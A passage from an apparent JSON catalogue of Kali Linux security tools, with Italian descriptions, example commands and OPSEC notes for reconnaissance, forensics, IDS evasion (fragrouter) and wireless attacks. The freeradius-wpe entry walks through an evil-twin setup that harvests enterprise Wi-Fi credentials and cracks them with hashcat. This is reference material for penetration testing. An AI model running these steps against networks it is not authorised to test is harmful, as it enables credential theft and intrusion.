legittimo. Le credenziali catturate appariranno nel log o nel file specificato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>VPN Security Assessment</strong>, fiked dimostra concretamente i rischi di configurazioni IKEv1 Aggressive Mode, convincendo i clienti a migrare a IKEv2 o modalità Main Mode.</p><p>In operazioni di <strong>Red Team</strong> con accesso alla rete interna, può catturare credenziali VPN di utenti remoti, potenzialmente fornendo accesso persistente da fuori la rete.</p><p>Per <strong>Security Awareness Training</strong>, mostra praticamente perché le VPN legacy sono pericolose e perché è importante verificare l'autenticità dei gateway prima di connettersi.</p><p>Nel <strong>Penetration Testing</strong> di infrastrutture legacy, identifica VPN ancora configurate con parametri vulnerabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisiti:</strong> Richiede posizione MITM già stabilita tramite ARP spoofing, DHCP spoofing, o compromissione del routing. Senza MITM, i client non raggiungeranno il fake gateway.</p><p><strong>Limitazioni:</strong> Inefficace contro IKEv2 o IKEv1 Main Mode che non espongono l'hash PSK. VPN con autenticazione basata su certificati sono immuni. I client moderni potrebbero validare il certificato del gateway.</p><p><strong>Rilevamento:</strong> L'ARP spoofing necessario per MITM è facilmente rilevabile. Il mismatch di certificati o fingerprint può generare warning sui client. IDS possono identificare il traffico IKE anomalo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "finalrecon",
    "name": "finalrecon",
    "version": "1.1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/finalrecon/",
    "desc": "Tool OSINT all-in-one per ricognizione web: whois, header, SSL, crawler, subdomain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FinalRecon</strong> è uno strumento Python all-in-one per la ricognizione web automatizzata, progettato per raccogliere il massimo di informazioni su un dominio target con un singolo comando. Combina molteplici moduli di reconnaissance: <strong>WHOIS lookup</strong> (informazioni di registrazione dominio), <strong>analisi header HTTP</strong> (server, tecnologie, security headers), <strong>informazioni certificato SSL/TLS</strong> (emittente, scadenza, SAN), <strong>web crawling</strong> (scoperta URL, form, link esterni), <strong>enumerazione subdomain</strong> (da fonti passive multiple), <strong>Wayback Machine</strong> (URL storici archiviati) e <strong>DNS enumeration</strong> (record A, MX, NS, TXT, CNAME). A differenza di tool specializzati che si concentrano su un singolo aspetto, FinalRecon fornisce una panoramica completa del target in un unico report, ideale come primo step di ricognizione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WHOIS Intelligence:</strong> Recupera informazioni complete sulla registrazione del dominio: registrar, date di creazione/scadenza, name server, contatti del registrante (quando non protetti da privacy). Utile per identificare l'organizzazione proprietaria e la scadenza del dominio.</p><p><strong>Header & Security Analysis:</strong> Analizza gli header HTTP della risposta per identificare il web server (Apache, Nginx, IIS), framework backend, CDN utilizzata e, soprattutto, la presenza o assenza di security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options). L'assenza di security headers è un finding di security assessment.</p><p><strong>SSL/TLS Certificate Info:</strong> Estrae e analizza il certificato SSL: Common Name, Subject Alternative Names (SAN), emittente, algoritmo di firma, date di validità e protocolli TLS supportati. I SAN possono rivelare subdomain e domini correlati non altrimenti visibili.</p><p><strong>Web Crawling:</strong> Naviga ricorsivamente il sito target estraendo URL interni, URL esterni, form con parametri, file JavaScript, immagini e altre risorse. Costruisce una mappa del sito utile per identificare pagine nascoste e punti di ingresso per test successivi.</p><p><strong>Wayback Machine Integration:</strong> Interroga l'Internet Archive per recuperare URL storici del sito target. Pagine rimosse, pannelli di amministrazione, API endpoint e file di backup che non sono più linkati possono ancora essere accessibili se non eliminati dal server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare FinalRecon specificando il dominio target e i moduli desiderati.</p><pre><code># Scan completo con tutti i moduli\nfinalrecon --full https://target.com\n\n# Solo analisi header e SSL\nfinalrecon --headers --sslinfo https://target.com\n\n# Enumerazione subdomain\nfinalrecon --sub https://target.com\n\n# Web crawling\nfinalrecon --crawl https://target.com\n\n# Ricerca URL storici su Wayback Machine\nfinalrecon --wayback https://target.com\n\n# DNS enumeration\nfinalrecon --dns https://target.com\n\n# WHOIS lookup\nfinalrecon --whois https://target.com\n\n# Scan completo con export su file\nfinalrecon --full https://target.com -o report.txt\n\n# Con output directory personalizzata\nfinalrecon --full https://target.com -d /tmp/recon_results/</code></pre><p>L'output è colorato e organizzato per sezione, con riassunti delle informazioni più rilevanti evidenziate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Initial Reconnaissance:</strong> Primo tool da lanciare quando si inizia a lavorare su un nuovo target. Fornisce una panoramica completa che guida le fasi successive dell'assessment, identificando tecnologie, subdomain e potenziali punti deboli.</p><p><strong>Bug Bounty:</strong> Raccolta rapida di informazioni su un nuovo scope di bug bounty. I moduli Wayback e crawl spesso rivelano endpoint dimenticati e pagine di test ancora accessibili.</p><p><strong>OSINT Investigation:</strong> Profiling base di organizzazioni per indagini: il WHOIS rivela proprietari e contatti, i subdomain mappano l'infrastruttura, i certificati SSL rivelano relazioni tra domini.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Componenti attive e passive:</strong> I moduli WHOIS, SSL e DNS sono operazioni passive che non toccano direttamente il web server target. I moduli crawl e header analysis sono attivi e lasciano tracce nei log del server (IP, User-Agent). Il modulo Wayback interroga l'Internet Archive, non il target.</p><p><strong>Footprint:</strong> Il web crawling genera molteplici richieste HTTP al target, visibili nei log. In ambienti monitorati, considerare l'uso di un proxy o VPN per mascherare l'IP sorgente.</p><p><strong>Alternative:</strong> Per ricognizione più profonda, combinare con tool specializzati: subfinder/amass per subdomain, httpx per probing, nuclei per vulnerability scanning. FinalRecon è ottimo per una vista d'insieme rapida ma non sostituisce tool dedicati per analisi approfondite.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Domain_Recon"
    ],
    "notes": null
  },
  {
    "id": "findomain",
    "name": "findomain",
    "version": "10.0.1",
    "icon": "../app/icons/findomain-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/findomain/",
    "desc": "Enumerazione sottodomini velocissima usando API multiple (CT logs, DNS, scraping).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Findomain</strong> è un tool di subdomain enumeration estremamente veloce scritto in Rust. Interroga multiple fonti (Certificate Transparency logs, API di servizi DNS, motori di ricerca) per trovare subdomain senza brute forcing. Supporta monitoring continuo e notifiche per nuovi subdomain.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Usa 10+ fonti per enumerazione.</p><p><strong>CT Logs:</strong> Cerca in Certificate Transparency logs.</p><p><strong>High Speed:</strong> Scritto in Rust per performance.</p><p><strong>Monitoring:</strong> Monitora nuovi subdomain nel tempo.</p><p><strong>Resolution:</strong> Risolve subdomain trovati opzionalmente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera con risoluzione e output multipli\nfindomain -t target.com -r -o --output-file subs.txt\n\n# Bulk scan da lista domini\nfindomain -f domains.txt -r -u subdomains.txt\n\n# Con tutte le API configurate\nexport SPYSE_TOKEN=xxx\nexport VIRUSTOTAL_TOKEN=xxx\nfindomain -t target.com -r\n\n# Monitoring con webhook notifiche\nfindomain -t target.com --monitoring \\\n  --discord-webhook \"https://discord.com/api/webhooks/xxx\"\n\n# Pipeline completa: enum -&gt; probe -&gt; scan\nfindomain -t target.com -q -r | httpx -silent | nuclei -t cves/\n\n# Solo IP unique (no duplicati)\nfindomain -t target.com -r --ip-only | sort -u\n\n# Export JSON per analisi\nfindomain -t target.com -r -o --json\n\n# Esclusione pattern\nfindomain -t target.com --exclude \"test,dev,staging\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Discovery</strong>, alternativa veloce a subfinder/amass.</p><p>Nel <strong>Bug Bounty</strong>, enumerazione rapida di nuovi scope.</p><p><strong>Monitoring</strong> per asset discovery continua.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Non genera traffico verso il target direttamente. Query a servizi terzi potrebbero essere loggabili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "firewalk",
    "name": "firewalk",
    "version": "5.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/firewalk/",
    "desc": "Determina regole firewall analizzando risposte TTL per mappare ACL di gateway.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Firewalk</strong> è uno strumento di network reconnaissance che determina quali porte e protocolli sono <strong>permessi attraverso un firewall o un router con ACL</strong>, senza avere accesso diretto alla configurazione del dispositivo. La tecnica si basa sulla manipolazione del campo <strong>TTL (Time To Live)</strong> dei pacchetti IP: Firewalk prima determina il numero esatto di hop fino al gateway target (fase di ramping), poi invia pacchetti di probing con TTL impostato per scadere <em>esattamente un hop oltre</em> il gateway. Se il gateway permette il traffico su quella porta, il pacchetto viene inoltrato e il router successivo risponde con un ICMP TTL Exceeded. Se il gateway blocca il traffico, non si riceve alcuna risposta. Questa tecnica, pubblicata originariamente come paper accademico da Mike Schiffman e David Goldsmith, è stata la prima a permettere il mapping remoto delle regole ACL dei firewall.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ACL Rule Mapping:</strong> Determina quali porte TCP/UDP sono permesse attraverso un dispositivo di filtraggio (firewall, router con ACL, security appliance). Ogni porta viene classificata come \"open\" (permessa) o \"filtered\" (bloccata) basandosi sulle risposte ICMP ricevute.</p><p><strong>TTL Ramping Phase:</strong> Prima dell'analisi, Firewalk esegue una fase di \"ramping\" per determinare il numero preciso di hop tra l'attaccante e il gateway target. Questo è fondamentale per impostare correttamente il TTL dei pacchetti di probing nella fase successiva.</p><p><strong>Protocol Support:</strong> Supporta probing sia TCP che UDP. Per TCP, invia pacchetti SYN verso le porte specificate. Per UDP, invia datagrammi vuoti o con payload minimo. La scelta del protocollo influenza l'accuratezza dei risultati.</p><p><strong>Port Range Scanning:</strong> Permette di specificare range di porte da testare (es. 1-1024) per mappare sistematicamente tutte le regole del firewall per le porte più comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Firewalk richiede due argomenti principali: l'IP del gateway (firewall) e l'IP di un host oltre il gateway (target).</p><pre><code># Scan TCP porte 1-1000 attraverso il gateway\nfirewalk -S1-1000 -i eth0 192.168.1.1 10.0.0.1\n\n# Scan UDP\nfirewalk -S1-1000 -i eth0 -pUDP 192.168.1.1 10.0.0.1\n\n# Scan porte specifiche (HTTP, HTTPS, SSH, DNS, SMB)\nfirewalk -S80,443,22,53,445 -i eth0 192.168.1.1 10.0.0.1\n\n# Verbose output con dettagli TTL\nfirewalk -S1-1000 -i eth0 -v 192.168.1.1 10.0.0.1\n\n# Specificare TTL iniziale manualmente (skip ramping)\nfirewalk -S1-100 -i eth0 -n 3 192.168.1.1 10.0.0.1\n\n# Timeout personalizzato per risposte\nfirewalk -S1-1000 -i eth0 -T 2 192.168.1.1 10.0.0.1</code></pre><p>L'output mostra per ogni porta se è stata classificata come \"open\" (permessa dal firewall) o se non ha ricevuto risposta (bloccata). Le porte aperte indicano regole ACL che permettono quel traffico.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Firewall Rule Auditing:</strong> Verificare le regole effettive di un firewall senza accesso alla configurazione. Utile per auditor che devono validare che le ACL implementate corrispondano a quelle documentate nella policy di sicurezza.</p><p><strong>Perimeter Assessment:</strong> Durante un penetration test esterno, determinare quali porte sono raggiungibili attraverso il firewall perimetrale dell'organizzazione. Le porte aperte rappresentano la superficie di attacco effettiva.</p><p><strong>Network Segmentation Testing:</strong> Verificare che la segmentazione di rete sia implementata correttamente, testando quali porte sono raggiungibili tra VLAN diverse attraverso router con ACL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Pacchetti con TTL anomali e incrementali possono essere rilevati da IDS/IPS come attività di firewalk scanning. I firewall next-generation possono identificare e bloccare questo pattern di traffico.</p><p><strong>Limitazioni:</strong> Firewall stateful moderni e proxy-based firewall possono non rispondere in modo prevedibile alla tecnica TTL, producendo risultati inaccurati. I firewall che non decrementano il TTL o che non generano ICMP TTL Exceeded rendono lo strumento inefficace.</p><p><strong>Storicità:</strong> La tecnica è nota e documentata da oltre 20 anni. IDS moderni la rilevano facilmente. In contesti attuali, combinare con tecniche di port scanning tradizionali (nmap) per risultati più affidabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "foremost",
    "name": "foremost",
    "version": "1.5.7",
    "icon": "../app/icons/foremost-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/foremost/",
    "desc": "File carving tool forense per recuperare file da immagini disco basandosi su header.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Foremost</strong> è un tool di file carving forense che recupera file da immagini disco basandosi su header, footer e strutture dati interne. Ignora il filesystem e cerca direttamente pattern di file conosciuti. Recupera file anche quando il filesystem è corrotto o cancellato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Header-Based:</strong> Cerca file tramite signature header.</p><p><strong>Multi-Format:</strong> Supporta jpg, png, gif, pdf, doc, exe, zip e altri.</p><p><strong>Configurable:</strong> Aggiungi signature custom in config file.</p><p><strong>Raw Disk:</strong> Lavora su immagini raw e device.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Carving completo con audit file\nforemost -v -T -i disk.img -o /cases/case001/carved/\n\n# Solo documenti (office, pdf)\nforemost -t doc,docx,xls,xlsx,pdf,ppt -i disk.img -o documents/\n\n# Immagini e video\nforemost -t jpg,png,gif,bmp,tif,avi,mov,mpg,wmv -i disk.img -o media/\n\n# Carving da range specifico (offset)\nforemost -i disk.img -o output/ -q  # quiet mode, solo risultati\n\n# Con config custom per signature aggiuntive\ncp /etc/foremost.conf ./custom.conf\n# Aggiungi signature custom\nforemost -c custom.conf -i disk.img -o output/\n\n# Pipeline: dd range -&gt; foremost\ndd if=disk.img bs=512 skip=1000 count=10000 | foremost -T -o partial_carve/\n\n# Carving da RAM dump per artifacts\nforemost -t all -i memory.dmp -o ram_artifacts/\n\n# Solo eseguibili (malware hunting)\nforemost -t exe,dll,sys -i disk.img -o executables/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, recupera evidenze da dischi.</p><p>Nel <strong>Data Recovery</strong>, ripristina file da dischi danneggiati.</p><p><strong>Incident Response</strong> per recuperare file cancellati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Sempre su copia forense, mai su originale. Considera anche scalpel e photorec per formati aggiuntivi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "fping",
    "name": "fping",
    "version": "5.1",
    "icon": "../app/icons/fping-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fping/",
    "desc": "Ping parallelo per scansione rapida di host attivi su range di IP multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fping</strong> è uno strumento simile a ping ma ottimizzato per scansionare host multipli in parallelo. Permette di verificare rapidamente quali host sono attivi in un range di IP, inviando ICMP echo request a molti target simultaneamente invece che sequenzialmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Parallel Ping:</strong> Scansiona molti host contemporaneamente.</p><p><strong>Range Support:</strong> Accetta CIDR notation e range.</p><p><strong>File Input:</strong> Legge target da file.</p><p><strong>Statistics:</strong> Calcola statistiche su latenza e packet loss.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Discovery veloce: solo host vivi, output pulito\nfping -a -g 192.168.1.0/24 2&gt;/dev/null | tee alive_hosts.txt\n\n# Scan multipli range con timeout ridotto\nfping -a -r 1 -t 100 -g 10.0.0.0/24 172.16.0.0/24 192.168.0.0/24 2&gt;/dev/null\n\n# Con statistiche dettagliate\nfping -s -c 3 -g 192.168.1.0/24\n\n# Output per nmap (solo IP)\nfping -a -g 192.168.1.0/24 2&gt;/dev/null &gt; targets.txt\nnmap -iL targets.txt -sV\n\n# Genera range da netmask alternativo\nfping -a -g 192.168.1.1 192.168.1.254 2&gt;/dev/null\n\n# Loop monitoring\nfping -l -p 1000 -B 1.5 server1 server2 server3\n\n# Pipeline con masscan per porte\nfping -a -g 10.0.0.0/8 2&gt;/dev/null | \\\n  xargs -I{} masscan {} -p80,443,22 --rate=1000\n\n# Quiet con conteggio risultati\nfping -a -q -g 192.168.0.0/16 2&gt;/dev/null | wc -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Host Discovery</strong>, identifica rapidamente host attivi.</p><p>Nel <strong>Network Mapping</strong>, primo step di ricognizione.</p><p><strong>Monitoring</strong> per verificare disponibilità di server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ICMP può essere bloccato/loggato. Alcuni host non rispondono a ping ma sono attivi. Usa in combinazione con altre tecniche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "fragrouter",
    "name": "fragrouter",
    "version": "1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fragrouter/",
    "desc": "IDS evasion toolkit che frammenta pacchetti per bypassare sistemi di rilevamento.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Fragrouter</strong> è uno strumento storico di <strong>IDS evasion</strong> che funziona come router/proxy di rete locale, intercettando il traffico in uscita e manipolandolo prima di inoltrarlo alla destinazione. La manipolazione principale consiste nella <strong>frammentazione</strong> dei pacchetti IP in modi che confondono i sistemi di rilevamento intrusioni (IDS), pur mantenendo la corretta ricostruzione sul sistema target. Lo strumento implementa le tecniche di evasione IDS descritte nel famoso paper di Ptacek e Newsham \"Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection\" (1998). Fragrouter si interpone nel percorso del traffico di rete e applica trasformazioni ai pacchetti: frammentazione in pezzi piccoli, riordinamento dei frammenti, sovrapposizione con dati falsi e altre tecniche che sfruttano le ambiguità nella ricostruzione dei pacchetti frammentati da parte degli IDS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Fragmentation Attacks:</strong> Frammenta pacchetti IP in segmenti di dimensione configurabile (es. 8, 16, 24 byte). Gli IDS che non riassemblano correttamente i frammenti non riescono a ispezionare il payload completo, permettendo a exploit e payload di passare senza essere rilevati.</p><p><strong>Fragment Reordering:</strong> Invia i frammenti in ordine casuale anziché sequenziale. Il sistema target ricostruisce correttamente il pacchetto originale (TCP/IP gestisce il riordinamento), ma IDS semplici che ispezionano i frammenti in ordine di arrivo potrebbero non riuscire a riassemblare il contenuto.</p><p><strong>Overlapping Fragments:</strong> Crea frammenti IP sovrapposti contenenti dati diversi. Il modo in cui il sistema operativo target gestisce la sovrapposizione (primo o ultimo frammento vince) differisce da come l'IDS la gestisce, creando una discrepanza che permette l'evasione.</p><p><strong>Multiple Evasion Modes:</strong> Implementa oltre 30 modalità di evasione diverse, dalla frammentazione semplice a tecniche avanzate come la frammentazione TCP segment, IP TTL manipulation e combinazioni di più tecniche simultaneamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Fragrouter funziona come un router: intercetta il traffico dalla macchina locale e lo inoltra manipolato. Richiede che il routing IP sia configurato per passare attraverso di esso.</p><pre><code># Abilitare IP forwarding\necho 1 &gt; /proc/sys/net/ipv4/ip_forward\n\n# Modalità B1: frammentazione IP base (no modifiche)\nfragrouter -B1\n\n# Modalità F1: frammenti ordinati da 8 byte\nfragrouter -F1\n\n# Modalità F2: frammenti in ordine casuale da 8 byte\nfragrouter -F2\n\n# Modalità F3: frammenti sovrapposti\nfragrouter -F3\n\n# Modalità F4: frammenti da 8 byte con uno spazzatura\nfragrouter -F4\n\n# Modalità F5: frammenti fuori ordine con un frammento corto\nfragrouter -F5\n\n# Lista tutte le modalità disponibili\nfragrouter -h\n\n# Uso con nmap: lanciare nmap mentre fragrouter è attivo\n# Terminal 1: fragrouter -F2\n# Terminal 2: nmap -sS target_ip</code></pre><p>Mentre fragrouter è in esecuzione, tutto il traffico in uscita dalla macchina viene frammentato secondo la modalità selezionata. Combinare con nmap, exploit o qualsiasi altro tool di attacco.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>IDS/IPS Testing:</strong> Verificare se l'IDS aziendale è in grado di rilevare attacchi quando il traffico è frammentato. Un IDS che non riesce a riassemblare correttamente il traffico frammentato ha un punto cieco critico.</p><p><strong>Red Team Evasion:</strong> Durante operazioni red team, fragrouter può essere usato per ridurre la probabilità di detection degli scan di rete e dell'exploitation da parte di IDS di rete.</p><p><strong>Security Research:</strong> Studio delle tecniche di evasione IDS basate su frammentazione e analisi della capacità di ricostruzione dei vari IDS/IPS commerciali e open-source.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia limitata:</strong> Fragrouter è uno strumento degli anni '90. Gli IDS/IPS moderni (Snort 3, Suricata, Zeek) implementano ricostruzione completa del flusso TCP e riassemblamento IP robusto, rendendo la maggior parte delle tecniche di fragrouter inefficace contro soluzioni attuali.</p><p><strong>Traffico anomalo:</strong> La frammentazione eccessiva e i pattern di frammenti sovrapposti o fuori ordine sono essi stessi indicatori di attacco e vengono rilevati come anomalie dalla maggior parte dei sistemi di monitoraggio moderni.</p><p><strong>Alternative moderne:</strong> Per evasione IDS contemporanea, considerare tecniche più sofisticate: encryption del traffico (tunnel), domain fronting, protocol tunneling (DNS over HTTPS, ICMP tunneling) o l'uso di nmap con opzioni di evasione integrate (<code>-f</code>, <code>--mtu</code>, <code>--data-length</code>).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "freeradius-wpe",
    "name": "freeradius-wpe",
    "version": "3.2.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/freeradius-wpe/",
    "desc": "FreeRADIUS patchato per catturare credenziali PEAP/MSCHAPv2 in evil twin attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>FreeRADIUS-WPE</strong> (Wireless Pwnage Edition) è una versione patchata del server RADIUS open-source <strong>FreeRADIUS</strong>, modificata specificamente per attacchi a reti <strong>WPA2/WPA3-Enterprise</strong>. In una rete enterprise, i client wireless si autenticano tramite protocolli EAP (PEAP-MSCHAPv2, EAP-TTLS) inviando le credenziali a un server RADIUS. FreeRADIUS-WPE, anziché validare queste credenziali, le <strong>cattura e logga</strong>: username in chiaro e hash MSCHAPv2 challenge/response. Combinato con un access point evil twin (tramite hostapd), questo setup permette di intercettare le credenziali di dominio degli utenti che si connettono alla rete WiFi fasulla. Le patch WPE sono state originariamente sviluppate da Brad Antoniewicz (Foundstone/McAfee) e sono diventate lo standard per il wireless penetration testing enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Logging Trasparente:</strong> Ogni tentativo di autenticazione EAP viene intercettato e loggato. Il server accetta qualsiasi credenziale (non valida realmente l'utente), catturando username, challenge e response MSCHAPv2. Il client crede di aver fallito l'autenticazione per un errore temporaneo e potrebbe ritentare automaticamente.</p><p><strong>MSCHAPv2 Challenge/Response Capture:</strong> Cattura la tripletta challenge/response di MSCHAPv2 nel formato direttamente utilizzabile da hashcat (mode 5500) o john the ripper per il cracking offline. Con una buona GPU, password deboli vengono crackate in pochi minuti.</p><p><strong>Multi-EAP Support:</strong> Gestisce i principali protocolli EAP enterprise: PEAP-MSCHAPv2 (il più comune), EAP-TTLS-PAP (password in chiaro!), EAP-TTLS-MSCHAPv2, e EAP-GTC. Se il client accetta EAP-GTC o EAP-TTLS-PAP, le credenziali vengono catturate in chiaro senza necessità di cracking.</p><p><strong>Certificate Generation:</strong> Include tool per generare certificati X.509 per il server RADIUS. Certificati personalizzati con CN e Organization dell'azienda target aumentano la credibilità dell'attacco, riducendo la probabilità che gli utenti rifiutino la connessione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>FreeRADIUS-WPE si usa in combinazione con hostapd per creare un evil twin WPA2-Enterprise completo.</p><pre><code># 1. Generare certificati per il server RADIUS\ncd /etc/freeradius/3.0/certs/\nmake\n\n# 2. Avviare FreeRADIUS-WPE in modalità debug\nradiusd -X\n\n# 3. In un altro terminale, configurare e avviare hostapd\n# hostapd.conf deve puntare al server RADIUS locale (127.0.0.1:1812)\nhostapd /etc/hostapd/hostapd-wpe.conf\n\n# 4. Monitorare le credenziali catturate in tempo reale\ntail -f /var/log/freeradius/freeradius-server-wpe.log\n\n# Output esempio nel log:\n# username: DOMAIN\\john.doe\n# challenge: 5a:3b:4c:...\n# response: 8f:2a:1b:...\n\n# 5. Cracking offline con hashcat\nhashcat -m 5500 captured_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Setup semplificato: usare eaphammer che automatizza tutto\n./eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap --creds</code></pre><p>Per un setup più rapido e automatizzato, considerare l'uso di <code>eaphammer</code> che integra FreeRADIUS-WPE, hostapd e la generazione certificati in un singolo comando.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>WPA2-Enterprise Penetration Testing:</strong> Valutare la sicurezza delle reti enterprise verificando se i client wireless validano correttamente il certificato del server RADIUS. Client non configurati con certificate pinning invieranno le credenziali al server fake.</p><p><strong>Red Team - Credential Harvesting:</strong> Le credenziali catturate sono tipicamente credenziali di dominio Active Directory (username e password). Una volta crackate, possono essere usate per accesso VPN, email, share di rete e lateral movement nell'infrastruttura aziendale.</p><p><strong>Lab & Training:</strong> Configurare un ambiente di test per dimostrare il rischio delle reti enterprise mal configurate durante training di security awareness per team IT e dipendenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento WIDS/WIPS:</strong> Le soluzioni Wireless Intrusion Detection (Cisco ISE, Aruba ClearPass) rilevano access point evil twin confrontando BSSID, SSID e fingerprint RF. L'attacco genera alert immediati in ambienti con WIPS attivo.</p><p><strong>Certificate Warning:</strong> Se il client ha configurato un profilo WiFi gestito (tramite MDM o GPO), il certificato del server RADIUS fake verrà rifiutato automaticamente. L'attacco funziona principalmente su dispositivi BYOD non gestiti o con configurazione WiFi manuale.</p><p><strong>Setup complesso:</strong> La configurazione manuale di FreeRADIUS-WPE + hostapd + scheda WiFi in AP mode è complessa e soggetta a errori. Per engagement reali, preferire <code>eaphammer</code> che automatizza l'intero processo. FreeRADIUS-WPE resta utile per configurazioni personalizzate e scenari avanzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "getallrepos",
    "name": "getallrepos",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/getallrepos/",
    "desc": "Scarica tutti i repository GitHub di un utente o organizzazione per analisi offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GetAllRepos</strong> e un tool a riga di comando progettato per scaricare automaticamente tutti i repository Git appartenenti a un determinato utente o organizzazione su piattaforme come GitHub e GitLab. Lo strumento si rivela particolarmente utile nelle fasi di ricognizione offensiva, quando un analista ha bisogno di ottenere una copia locale completa di tutto il codice pubblico associato a un target per condurre analisi approfondite offline. GetAllRepos gestisce automaticamente la paginazione delle API delle piattaforme, assicurando che nessun repository venga tralasciato anche quando un account ne contiene centinaia. Il processo di clonazione puo essere parallelizzato per ridurre significativamente i tempi di download, e il tool supporta l'autenticazione tramite token API per accedere anche a repository privati quando si dispone di credenziali valide. Scritto con focus sulla semplicita, non richiede configurazioni complesse e puo essere integrato facilmente in pipeline automatizzate di security assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Clonazione massiva automatizzata:</strong> GetAllRepos interroga le API di GitHub o GitLab per enumerare tutti i repository associati a un utente o organizzazione specificata, gestendo automaticamente la paginazione per account con molti repository. Ogni repository viene clonato localmente preservando l'intera history dei commit, consentendo analisi complete del codice e della sua evoluzione nel tempo.</p><p><strong>Supporto multi-piattaforma con autenticazione:</strong> Lo strumento supporta nativamente sia GitHub che GitLab come piattaforme sorgente, e puo essere configurato con token di autenticazione personali per accedere a repository privati. Questo e cruciale durante i penetration test autorizzati dove il cliente fornisce credenziali per analizzare anche il codice non pubblico, ampliando significativamente la superficie di analisi disponibile.</p><p><strong>Download parallelo e gestione incrementale:</strong> Per ottimizzare i tempi di acquisizione, GetAllRepos supporta la clonazione parallela di piu repository simultaneamente, riducendo drasticamente il tempo necessario per scaricare grandi quantita di codice. Il tool gestisce anche scenari di interruzione e ripresa, evitando di riscaricare repository gia presenti nella 